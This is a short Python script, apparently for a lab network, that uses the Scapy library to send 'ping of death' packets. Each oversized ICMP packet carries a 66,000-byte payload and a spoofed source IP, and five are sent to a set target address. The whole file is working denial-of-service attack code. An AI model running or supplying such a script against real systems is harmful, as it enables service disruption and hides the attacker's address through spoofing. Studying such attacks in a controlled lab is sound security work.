from scapy.all import *

# SOURCE_IP = "10.1.5.3" # Change this IP to spoof
TARGET_IP = "10.1.5.2"

def ping_of_death(SOURCE_IP = "10.1.5.3", count=5):
    ping_of_death = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/("A"*66000)

    for _ in range(count):
        send(ping_of_death, verbose=0)